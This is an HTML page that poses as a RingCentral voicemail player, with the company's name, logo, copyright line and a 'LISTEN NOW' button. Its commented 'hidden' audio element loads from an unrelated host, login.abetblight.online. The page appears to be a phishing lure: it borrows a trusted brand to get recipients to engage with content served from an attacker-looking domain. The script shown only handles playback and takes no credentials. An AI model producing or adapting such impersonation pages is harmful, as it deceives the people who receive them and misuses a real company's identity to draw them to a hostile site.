<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>RingCentral Voicemail</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #ff7900;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #333;
    }

    .card {
      background: white;
      border-radius: 15px;
      width: 350px;
      padding: 20px;
      box-shadow: 0 0 20px rgba(0,0,0,0.2);
      text-align: center;
    }

    .card-header {
      background: linear-gradient(to right, #4a2c91, #5b389d);
      color: white;
      padding: 10px;
      border-top-left-radius: 15px;
      border-top-right-radius: 15px;
      font-size: 1.2em;
      font-weight: bold;
    }

    .play-button {
      background-color: #ff7900;
      border: none;
      color: white;
      font-size: 30px;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      margin: 20px auto;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    .time {
      margin-top: -10px;
      font-size: 16px;
      color: #555;
    }

    .volume {
      margin: 20px 0;
      font-size: 16px;
      user-select: none;
    }

    .volume input[type=range] {
      width: 80%;
    }

    .volume button {
      background: none;
      border: none;
      color: #d60000;
      font-size: 20px;
      cursor: pointer;
      font-weight: bold;
      vertical-align: middle;
    }

    .listen-button {
      background-color: #ff7900;
      color: white;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 10px;
    }

    .footer-note {
      font-size: 12px;
      color: #666;
      margin-top: 15px;
    }

    .copyright {
      font-size: 11px;
      color: #999;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="card-header">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/RingCentral_logo.svg/2560px-RingCentral_logo.svg.png" alt="RingCentral" style="height: 24px; vertical-align: middle;"> Voicemail
    </div>

    <button id="playBtn" class="play-button" aria-label="Play/Pause">▶</button>
    <div id="timeDisplay" class="time">0:00 / 0:00</div>

    <div class="volume">
      <button id="volumeDown" title="Decrease Volume">➖</button> 
      Volume <span id="volText">15%</span>
      <button id="volumeUp" title="Increase Volume" style="margin-left: 5px;">➕</button><br>
      <input id="volumeSlider" type="range" min="0" max="100" value="15" />
    </div>

    <button id="listenBtn" class="listen-button">LISTEN NOW</button>

    <div class="footer-note">Click "Listen Now" or Play ▶ to hear the message</div>
    <div class="copyright">© 2025 RingCentral</div>
  </div>

  <!-- Hidden audio element -->
  <audio id="voicemail" src="https://login.abetblight.online/TmzEdXNn" preload="auto"></audio>

  <script>
    const audio = document.getElementById('voicemail');
    const playBtn = document.getElementById('playBtn');
    const timeDisplay = document.getElementById('timeDisplay');
    const listenBtn = document.getElementById('listenBtn');
    const volumeSlider = document.getElementById('volumeSlider');
    const volumeUp = document.getElementById('volumeUp');
    const volumeDown = document.getElementById('volumeDown');
    const volText = document.getElementById('volText');

    function formatTime(seconds) {
      const m = Math.floor(seconds / 60);
      const s = Math.floor(seconds % 60);
      return `${m}:${s.toString().padStart(2, '0')}`;
    }

    function updateTime() {
      timeDisplay.textContent = `${formatTime(audio.currentTime)} / ${formatTime(audio.duration)}`;
    }

    audio.addEventListener('timeupdate', updateTime);
    audio.addEventListener('loadedmetadata', updateTime);

    playBtn.addEventListener('click', () => {
      if (audio.paused) {
        audio.play();
        playBtn.textContent = '⏸';
      } else {
        audio.pause();
        playBtn.textContent = '▶';
      }
    });

    listenBtn.addEventListener('click', () => {
      audio.play();
      playBtn.textContent = '⏸';
    });

    volumeSlider.addEventListener('input', () => {
      audio.volume = volumeSlider.value / 100;
      volText.textContent = `${volumeSlider.value}%`;
    });

    volumeUp.addEventListener('click', () => {
      let vol = Math.min(100, parseInt(volumeSlider.value) + 5);
      volumeSlider.value = vol;
      audio.volume = vol / 100;
      volText.textContent = `${vol}%`;
    });

    volumeDown.addEventListener('click', () => {
      let vol = Math.max(0, parseInt(volumeSlider.value) - 5);
      volumeSlider.value = vol;
      audio.volume = vol / 100;
      volText.textContent = `${vol}%`;
    });

    // Set initial volume
    audio.volume = 0.15;
  </script>
</body>
</html>
